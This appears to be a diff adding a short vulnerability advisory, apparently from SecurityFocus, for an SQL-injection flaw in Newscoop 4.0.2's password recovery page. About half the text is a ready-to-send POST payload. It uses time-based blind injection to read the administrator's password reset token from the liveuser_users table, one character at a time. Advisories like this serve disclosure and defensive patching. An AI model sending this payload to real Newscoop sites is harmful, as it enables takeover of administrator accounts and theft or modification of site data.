@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/56800/info
+
+Newscoop is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Newscoop 4.0.2 is vulnerable; other versions may also be affected. 
+
+Script: /admin/password_recovery.php
+Payload: f_post_sent=1&f_email=example@example.com' and (select if(substr(password_reset_token,15,1)='1',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password 
